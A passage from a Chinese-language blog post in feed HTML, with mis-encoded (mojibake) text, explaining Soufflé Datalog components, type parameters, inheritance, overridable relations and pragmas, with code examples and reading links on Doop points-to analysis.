class="symbol">A</span>(x,y) :- <span class="symbol">B</span>(x,y).</span><br></pre></td></tr></table></figure><h3 id="ç»„ä»¶"><a href="#ç»„ä»¶" class="headerlink" title="ç»„ä»¶"></a>ç»„ä»¶</h3><p>SoufflÃ© æœ‰ç»„ä»¶è¿™ä¸ªæ¦‚å¿µï¼Œå¯ç”¨äºæ¨¡å—åŒ–å¤§å‹é€»è¾‘ç¨‹åºã€‚ä¸€ä¸ªç»„ä»¶å¯èƒ½åŒ…å«å…¶ä»–ç»„ä»¶ã€å…³ç³»ã€ç±»å‹å£°æ˜ã€äº‹å®ã€è§„åˆ™å’ŒæŒ‡ä»¤ï¼›ç»„ä»¶å¿…é¡»å£°æ˜å’Œå®ä¾‹åŒ–åæ‰å¯ä»¥ä½¿ç”¨ï¼Œæ¯ä¸ªç»„ä»¶éƒ½æœ‰è‡ªå·±çš„å‘½åç©ºé—´ï¼›ç»„ä»¶å¯ä»¥ç»§æ‰¿ä¸€ä¸ªæˆ–å¤šä¸ªè¶…çº§ç»„ä»¶ã€‚</p><h3 id="ç”¨æˆ·å®šä¹‰å‡½å­"><a href="#ç”¨æˆ·å®šä¹‰å‡½å­" class="headerlink" title="ç”¨æˆ·å®šä¹‰å‡½å­"></a>ç”¨æˆ·å®šä¹‰å‡½å­</h3><p>å¯ä»¥ä½¿ç”¨ç”¨æˆ·å®šä¹‰å‡½å­æ‰©å±• SoufflÃ©ï¼Œç”¨æˆ·å®šä¹‰å‡½å­ç”¨ C&#x2F;C++ å®ç°ã€‚ç”¨æˆ·å®šä¹‰å‡½å­æœ‰ä¸¤ç§é£æ ¼ï¼šæœ´ç´ å‡½å­å’Œæœ‰çŠ¶æ€çš„å‡½å­ï¼Œæœ‰çŠ¶æ€çš„å‡½å­å…¬å¼€è®°å½•å’Œç¬¦å·è¡¨ã€‚</p><h3 id="ç¼–è¯‘æŒ‡ä»¤"><a href="#ç¼–è¯‘æŒ‡ä»¤" class="headerlink" title="ç¼–è¯‘æŒ‡ä»¤"></a>ç¼–è¯‘æŒ‡ä»¤</h3><p>ç”¨ç¼–è¯‘æŒ‡ä»¤é…ç½® SoufflÃ©ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥åœ¨æºç ä¸­è®¾ç½®å‘½ä»¤è¡Œé€‰é¡¹ã€‚</p><h2 id="ç»„ä»¶-Components"><a href="#ç»„ä»¶-Components" class="headerlink" title="ç»„ä»¶ Components"></a>ç»„ä»¶ Components</h2><p>ç»„ä»¶æ˜¯ç¨‹åºçš„æ¨¡å—åŒ–éƒ¨åˆ†ï¼Œå¯ä»¥å°è£…å…ƒç´ ï¼ŒåŒ…æ‹¬å…³ç³»å£°æ˜ã€ç±»å‹å£°æ˜ã€è§„åˆ™ã€äº‹å®ã€æŒ‡ä»¤å’Œå…¶ä»–ç»„ä»¶ã€‚ç»„ä»¶åŒ…å«å£°æ˜å’Œå®ä¾‹åŒ–ä¸¤ä¸ªæ“ä½œã€‚</p><p>ä½¿ç”¨ <code>.comp</code> å…³é”®å­—å£°æ˜ç»„ä»¶ï¼Œç»„ä»¶åŒ…å«çš„å…ƒç´ å®šä¹‰åœ¨ <code>&#123;...&#125;</code> å†…ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">MyComponent</span> &#123;</span><br><span class="line">    .type myType = number        // type</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myType)    // component relation</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // component fact</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>.init</code> å…³é”®å­—åˆå§‹åŒ–ç»„ä»¶ï¼Œåœ¨å†…éƒ¨ï¼ŒSoufflÃ© å°†ç»„ä»¶å®ä¾‹æ‰å¹³åŒ–ï¼ˆflattenï¼‰ï¼Œå¹¶ä¸ºæ¯ä¸ªç»„ä»¶å®ä¾‹åˆ›å»ºå‘½åç©ºé—´ï¼Œå› æ­¤è¦ç”¨é™å®šåç§°è°ƒç”¨å…¶ä¸­çš„å…ƒç´ ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.init myInstance1 = <span class="symbol">MyComponent</span>         // å®ä¾‹åŒ–</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).    // . é™å®š</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>å¯¹äºä¸Šé¢çš„ä¾‹å­ï¼ŒSoufflÃ© åœ¨å†…éƒ¨å¯¹ç»„ä»¶å®ä¾‹è¿›è¡Œäº†å¦‚ä¸‹æ‰©å±•ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.type myInstance1.myType = number</span><br><span class="line">.decl myInstance1.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance1.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ <code>souffle --show=transformed-datalog xxx.dl &gt; expansion.dl</code> ç”Ÿæˆæ‰©å±•åçš„ datalog æ–‡ä»¶ã€‚</p><p>ä¸‹é¢å®šä¹‰äº†ä¸¤ä¸ª MyComponent å®ä¾‹ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.init myInstance1 = <span class="symbol">MyComponent</span></span><br><span class="line">.init myInstance2 = <span class="symbol">MyComponent</span></span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">33</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x). </span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance2.<span class="symbol">TheAnswer</span>(x). </span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>SoufflÃ© åœ¨å†…éƒ¨ç”Ÿæˆä»¥ä¸‹é€»è¾‘ç¨‹åºï¼Œé€šè¿‡å‰ç¼€é¿å…åç§°å†²çªï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.type myInstance1.myType = number</span><br><span class="line">.decl myInstance1.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance1.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line">.type myInstance2.myType = number</span><br><span class="line">.decl myInstance2.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">33</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance2.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>å¦‚æœè§„åˆ™&#x2F;äº‹å®åœ¨æ²¡æœ‰å…³ç³»å£°æ˜çš„ç»„ä»¶ä¸­å®šä¹‰ï¼ŒSoufflÃ© ä¸ä¼šé¢„å…ˆæ·»åŠ å‰ç¼€ï¼Œè€Œæ˜¯ä¼šå°†è§£ææ¨è¿Ÿåˆ°å®é™…çš„ç»„ä»¶å®ä¾‹åŒ–ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Out</span>(x:number) </span><br><span class="line">.comp <span class="symbol">A</span> &#123; </span><br><span class="line">   .decl <span class="symbol">R</span>(x:number) </span><br><span class="line">   .comp <span class="symbol">Count</span> &#123;              // åœ¨ç»„ä»¶å†…éƒ¨å®šä¹‰ç»„ä»¶</span><br><span class="line">       <span class="symbol">R</span>(<span class="number">1</span>).                  // fact accessing <span class="symbol">R</span> outside of <span class="symbol">Count</span></span><br><span class="line">       <span class="symbol">R</span>(x+<span class="number">1</span>):- <span class="symbol">R</span>(x), x&lt;<span class="number">10.</span>   // rule accessing <span class="symbol">R</span> outside of <span class="symbol">Count</span></span><br><span class="line">   &#125; </span><br><span class="line">   .init myCount = <span class="symbol">Count</span>      // instantiate <span class="symbol">Count</span></span><br><span class="line">   <span class="symbol">Out</span>(x) :- <span class="symbol">R</span>(x).            // rule accessing <span class="symbol">Out</span> outside of <span class="symbol">A</span> </span><br><span class="line">&#125;</span><br><span class="line">.init myA = <span class="symbol">A</span></span><br><span class="line">.output <span class="symbol">Out</span></span><br></pre></td></tr></table></figure><p>SoufflÃ© ä¼šå°†ä»£ç æ‰©å±•ï¼Œå®é™…ä¼šæ˜¯è¿™æ ·ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Out</span>(x:number) </span><br><span class="line">.decl myA.<span class="symbol">R</span>(x:number) </span><br><span class="line">myA.<span class="symbol">R</span>(<span class="number">1</span>).</span><br><span class="line">myA.<span class="symbol">R</span>((x+<span class="number">1</span>)) :- myA.<span class="symbol">R</span>(x), x &lt; <span class="number">10.</span></span><br><span class="line"><span class="symbol">Out</span>(x) :- </span><br><span class="line">   myA.<span class="symbol">R</span>(x).</span><br><span class="line">.output <span class="symbol">Out</span></span><br></pre></td></tr></table></figure><p>å¦‚æœè§„åˆ™å’Œäº‹å®åœ¨æœ¬åœ°ä½œç”¨åŸŸä¸­è¢«å®ä¾‹åŒ–ï¼Œé‚£ä¹ˆå‰ç¼€å°†è¢«é¢„å…ˆæ·»åŠ åˆ°å‰é¢ã€‚</p><h3 id="ç±»å‹å‚æ•°åŒ–"><a href="#ç±»å‹å‚æ•°åŒ–" class="headerlink" title="ç±»å‹å‚æ•°åŒ–"></a>ç±»å‹å‚æ•°åŒ–</h3><p>ç»„ä»¶å¯ä»¥é€šè¿‡æœªé™å®šçš„ç±»å‹åç§°è¿›è¡Œå‚æ•°åŒ–ï¼Œä¸‹é¢çš„ä¾‹å­å®ä¾‹åŒ–äº†ä¸¤ä¸ªä¸åŒçš„ç±»å‹çš„ç»„ä»¶ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">ParamComponent</span>&lt;myType&gt; &#123;</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myType)    // component relation</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // component fact</span><br><span class="line">    .output <span class="symbol">TheAnswer</span>            // component output directive</span><br><span class="line">&#125;</span><br><span class="line">.init numberInstance = <span class="symbol">ParamComponent</span>&lt;number&gt;</span><br><span class="line">.init floatInstance = <span class="symbol">ParamComponent</span>&lt;float&gt;</span><br></pre></td></tr></table></figure><p>åœ¨å†…éƒ¨ï¼ŒSoufflÃ© å°†æ˜¾å¼å®ä¾‹åŒ–ä¸åŒå±æ€§çš„ç»„ä»¶ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl numberInstance.<span class="symbol">TheAnswer</span>(x:number)     // relation of numberInstance</span><br><span class="line">numberInstance.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).                // fact of numberInstance</span><br><span class="line">.output numberInstance.<span class="symbol">TheAnswer</span>             // output directive of numberInstance</span><br><span class="line"></span><br><span class="line">.decl floatInstance.<span class="symbol">TheAnswer</span>(x:float)       // relation of floatInstance</span><br><span class="line">floatInstance.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).                 // fact of floatInstance</span><br><span class="line">.output floatInstance.<span class="symbol">TheAnswer</span>              // output directive of floatInstance</span><br></pre></td></tr></table></figure><p>ç»„ä»¶åç§°ä¹Ÿå¯ä»¥ç”¨å‚æ•°ä¼ é€’ï¼Œä¾‹å¦‚ï¼Œå®ä¾‹åŒ–æ—¶æŒ‡å®šç”Ÿæˆç»„ä»¶ Oneï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">R</span>(x:number)</span><br><span class="line">.comp <span class="symbol">Case</span>&lt;<span class="symbol">Selector</span>&gt; &#123;</span><br><span class="line">   .comp <span class="symbol">One</span> &#123; </span><br><span class="line">     <span class="symbol">R</span>(<span class="number">1</span>). </span><br><span class="line">   &#125; </span><br><span class="line">   .comp <span class="symbol">Two</span> &#123; </span><br><span class="line">     <span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">   &#125; </span><br><span class="line">   .init selection = <span class="symbol">Selector</span> // instantiation depending on type parameter <span class="string">&quot;Selector&quot;</span> </span><br><span class="line">&#125; </span><br><span class="line">.init myCase = <span class="symbol">Case</span>&lt;<span class="symbol">One</span>&gt; </span><br><span class="line">.output <span class="symbol">R</span></span><br></pre></td></tr></table></figure><p>åœ¨å†…éƒ¨å°†ç”Ÿæˆä»¥ä¸‹ç¨‹åºï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">R</span>(x:number) </span><br><span class="line"><span class="symbol">R</span>(<span class="number">1</span>). </span><br><span class="line">.output <span class="symbol">R</span></span><br></pre></td></tr></table></figure><h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><p>ä¸€ä¸ªç»„ä»¶å¯ä»¥ç»§æ‰¿å¤šä¸ªè¶…çº§ç»„ä»¶ï¼Œè¶…çº§ç»„ä»¶çš„å…ƒç´ å°†è¢«ä¼ é€’ç»™å­ç»„ä»¶ã€‚ä½¿ç”¨ <code>:</code> ç»§æ‰¿è¶…çº§ç»„ä»¶ï¼Œç”¨ <code>,</code> åˆ†éš”ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">Base1</span> &#123;</span><br><span class="line">    .type myNumber = number</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myNumber)</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).</span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Base2</span> &#123; </span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">41</span>). </span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Sub</span>  : <span class="symbol">Base1</span>, <span class="symbol">Base2</span> &#123; // inherit from <span class="symbol">Base1</span> and <span class="symbol">Base2</span></span><br><span class="line">    .decl <span class="symbol">WhatIsTheAnswer</span>(n:myNumber)</span><br><span class="line">    <span class="symbol">WhatIsTheAnswer</span>(n) :- <span class="symbol">TheAnswer</span>(n).</span><br><span class="line">    .output <span class="symbol">WhatIsTheAnswer</span></span><br><span class="line">&#125;</span><br><span class="line">.init mySub = <span class="symbol">Sub</span></span><br></pre></td></tr></table></figure><p>ç»„ä»¶ Base1 å’Œ Base2 å°†æ‰€æœ‰ç»„ä»¶å…ƒç´ ä¼ é€’ç»™å­ç»„ä»¶ Subï¼Œåœ¨å†…éƒ¨å®ä¾‹åŒ– mySub æ—¶ç”Ÿæˆä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.type mySub.myNumber = number</span><br><span class="line">.decl mySub.<span class="symbol">TheAnswer</span>(x:mySub.myNumber) </span><br><span class="line">.decl mySub.<span class="symbol">WhatIsTheAnswer</span>(n:mySub.myNumber) </span><br><span class="line">mySub.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).</span><br><span class="line">mySub.<span class="symbol">TheAnswer</span>(<span class="number">41</span>).</span><br><span class="line">mySub.<span class="symbol">WhatIsTheAnswer</span>(n) :- mySub.<span class="symbol">TheAnswer</span>(n).</span><br><span class="line">.output mySub.<span class="symbol">WhatIsTheAnswer</span></span><br></pre></td></tr></table></figure><h3 id="å¯é‡å†™çš„å…³ç³»"><a href="#å¯é‡å†™çš„å…³ç³»" class="headerlink" title="å¯é‡å†™çš„å…³ç³»"></a>å¯é‡å†™çš„å…³ç³»</h3><p>å¦‚æœåœ¨è¶…çº§ç»„ä»¶ä¸­å°†å…³ç³»å£°æ˜ä¸ºå¯è¦†ç›–ï¼ˆ<code>overridable</code>ï¼‰ï¼Œåˆ™å­ç»„ä»¶å¯ä»¥é‡å†™å…³è”çš„è§„åˆ™å’Œäº‹å®ã€‚ä¾‹å¦‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">Base</span> &#123;</span><br><span class="line">    .decl <span class="symbol">R</span>(x:number) overridable</span><br><span class="line">    <span class="symbol">R</span>(<span class="number">1</span>).</span><br><span class="line">    <span class="symbol">R</span>(x+<span class="number">1</span>) :- <span class="symbol">R</span>(x), x &lt; <span class="number">5.</span> </span><br><span class="line">    .output <span class="symbol">R</span></span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Sub</span> : <span class="symbol">Base</span> &#123;</span><br><span class="line">    .override <span class="symbol">R</span></span><br><span class="line">    <span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">    <span class="symbol">R</span>(x+<span class="number">1</span>) :- <span class="symbol">R</span>(x), x &lt; <span class="number">4.</span> </span><br><span class="line">&#125;</span><br><span class="line">.init mySub = <span class="symbol">Sub</span></span><br></pre></td></tr></table></figure><p>å­ç»„ä»¶ä¸¢å¼ƒäº‹å® <code>R(1).</code> å’Œè§„åˆ™ <code>R(x+1) :- R(x), x &lt; 5.</code>ï¼Œç„¶åè¿›è¡Œé‡å†™ï¼Œåœ¨å†…éƒ¨å®ä¾‹åŒ– mySub æ—¶ç”Ÿæˆä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.decl mySub.<span class="symbol">R</span>(x:number)overridable </span><br><span class="line">mySub.<span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">mySub.<span class="symbol">R</span>((x+<span class="number">1</span>)) :- </span><br><span class="line">   mySub.<span class="symbol">R</span>(x),</span><br><span class="line">   x &lt; <span class="number">4.</span></span><br><span class="line">.output mySub.<span class="symbol">R</span></span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œå¯ä»¥ç”¨ PrecisePointsto ç»§æ‰¿å’Œè¦†ç›– AbstractPointsto çš„ HeapAllocationMerge å…³ç³»ï¼Œå®ç°æ›´ç²¾ç¡®çš„åˆ†æï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">AbstractPointsto</span>&#123;</span><br><span class="line">    .decl <span class="symbol">HeapAllocationMerge</span>(heap,mergeHeap) overridable</span><br><span class="line">    <span class="symbol">HeapAllocationMerge</span>(heap,<span class="string">&quot;&lt;&lt;string-constant&gt;&gt;&quot;</span>) :-</span><br><span class="line">        <span class="symbol">StringConstant</span>(heap).</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.comp <span class="symbol">PrecisePointsto</span> : <span class="symbol">AbstractPointsto</span>&#123;   // ç»§æ‰¿</span><br><span class="line">    .override <span class="symbol">HeapAllocationMerge</span>           // è¦†ç›–</span><br><span class="line">    <span class="symbol">HeapAllocationMerge</span>(heap,<span class="string">&quot;&lt;&lt;string-constant&gt;&gt;&quot;</span>) :-</span><br><span class="line">        <span class="symbol">StringConstant</span>(heap),</span><br><span class="line">        !<span class="symbol">ClassNameStringConstant</span>(heap),</span><br><span class="line">        !<span class="symbol">SimpleNameStringConstant</span>(heap).</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.init precise_pointsto = <span class="symbol">PrecisePointsto</span></span><br></pre></td></tr></table></figure><h3 id="ç±»å‹å‚æ•°åŒ–å’Œç»§æ‰¿"><a href="#ç±»å‹å‚æ•°åŒ–å’Œç»§æ‰¿" class="headerlink" title="ç±»å‹å‚æ•°åŒ–å’Œç»§æ‰¿"></a>ç±»å‹å‚æ•°åŒ–å’Œç»§æ‰¿</h3><p>è¶…çº§ç»„ä»¶çš„ç±»å‹å‚æ•°å¯ä»¥åœ¨å­ç»„ä»¶å£°æ˜ä¸­æ˜ç¡®æŒ‡å®šï¼Œä¸‹é¢å®šä¹‰äº†ä¸€ä¸ªå¸¦å‚æ•° K çš„å­ç»„ä»¶ Bï¼Œç”¨äºå®ä¾‹åŒ–å¸¦å‚æ•° K çš„è¶…ç»„ä»¶ Aï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">A</span>&lt;<span class="symbol">T</span>&gt; &#123; .... &#125;</span><br><span class="line">.comp <span class="symbol">B</span>&lt;<span class="symbol">K</span>&gt; : <span class="symbol">A</span>&lt;<span class="symbol">K</span>&gt; &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>ç±»å‹å‚æ•°ä¹Ÿå¯ä»¥ç”¨ä½œåŸºç±»ï¼ŒåŸºäºç±»å‹å‚æ•° T é€‰æ‹©æ€§ç»§æ‰¿ï¼Œ<code>A&lt;T&gt;</code> çš„å®ä¾‹å®šä¹‰ç»§æ‰¿çš„è¶…çº§ç»„ä»¶ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">A</span>&lt;<span class="symbol">T</span>&gt; : <span class="symbol">T</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç»§æ‰¿ï¼Œå¯ä»¥å®ç°å¤æ‚çš„ç»„ä»¶å®ä¾‹åŒ–ï¼Œæ³¨æ„è¿™é‡Œè¦å¼•å…¥ä¸€ä¸ªæ–°çš„ç»„ä»¶ï¼Œå› ä¸ºå‚æ•° <code>Graph&lt;number&gt;</code> ä¸æ˜¯ç®€å•çš„æ ‡è¯†ç¬¦ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// é”™è¯¯</span><br><span class="line">.init reach = <span class="symbol">Reachability</span>&lt;<span class="symbol">Graph</span>&lt;number&gt;&gt;   // syntax error</span><br><span class="line"></span><br><span class="line">// æ­£ç¡®</span><br><span class="line">.comp <span class="symbol">NumberGraph</span> : <span class="symbol">Graph</span>&lt;number&gt; &#123; &#125; // <span class="symbol">NumberGraph</span> inherits  </span><br><span class="line">.init reach = <span class="symbol">Reachability</span>&lt;<span class="symbol">NumberGraph</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘æŒ‡ä»¤-Pragma"><a href="#ç¼–è¯‘æŒ‡ä»¤-Pragma" class="headerlink" title="ç¼–è¯‘æŒ‡ä»¤ Pragma"></a>ç¼–è¯‘æŒ‡ä»¤ Pragma</h2><p>å…è®¸ç›´æ¥åœ¨æºç ä¸­è®¾ç½®å‘½ä»¤è¡Œæ ‡å¿—å’Œé…ç½®ï¼Œä¾‹å¦‚ä¸‹é¢çš„ä»£ç å°†åœ¨è°ƒç”¨ souffle æ—¶æŒ‡å®š <code>--legacy</code> æ ‡å¿—ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.pragma <span class="string">&quot;legacy&quot;</span> </span><br><span class="line">.decl <span class="symbol">A</span>(x:number) output</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>).</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€äº›é…ç½®ä¸èƒ½ç”¨å‘½ä»¤è¡Œæ ‡å¿—è®¾ç½®ï¼Œå› æ­¤ä¹Ÿå°±ä¸èƒ½ç”¨è¿™ç§æ–¹æ³•è®¾ç½®ã€‚</p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>æƒ³æ›´æ·±å…¥åœ°äº†è§£ Datalog å¯ä»¥çœ‹çœ‹ <a href="http://blogs.evergreen.edu/sosw/files/2014/04/Green-Vol5-DBS-017.pdf">Datalog and Recursive Query Processing</a>ï¼Œè¿˜æœ‰å­¦é•¿æ¨èçš„ <a href="https://www.jianshu.com/p/d7598d17ff2b">Dimension Shift! ä¸€èµ·æ¥å­¦Datalogå§ï¼</a>ï¼Œè¿™æ–¹é¢æˆ‘å€’æ˜¯æ²¡æœ‰æ‰©å±•åœ°å»çœ‹ï¼›Doop æ¡†æ¶çš„æå‡ºå¯ä»¥çœ‹ <a href="https://www.researchgate.net/publication/221321022_Strictly_Declarative_Specification_of_Sophisticated_Points-to_Analyses">Strictly Declarative Specification of Sophisticated Points-to Analyses</a>ï¼Œå…·ä½“çš„æŒ‡é’ˆåˆ†æå®ç°å¯ä»¥å‚è€ƒ <a href="http://yanniss.github.io/points-to-tutorial15.pdf">Pointer Analysis</a>ã€‚</p><p>Doop è™½ç„¶å¾ˆå¼ºå¤§ï¼Œä½†æ˜¯å­¦èµ·æ¥æ¯”è¾ƒå›°éš¾ï¼Œè€Œä¸”æˆ‘è¿˜æ²¡ä»€ä¹ˆ Java åŸºç¡€â€¦ è´¹åŠ²ã€‚</p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://bitbucket.org/yanniss/doop/src/master/">doop</a></li><li><a href="https://souffle-lang.github.io/index.html">SoufflÃ© | SoufflÃ© â€¢ A Datalog Synthesis Tool for Static Analysis</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Other/">Other</category>
      
      
      <category domain="https://jckling.github.io/tags/Datalog/">Datalog</category>
      
      
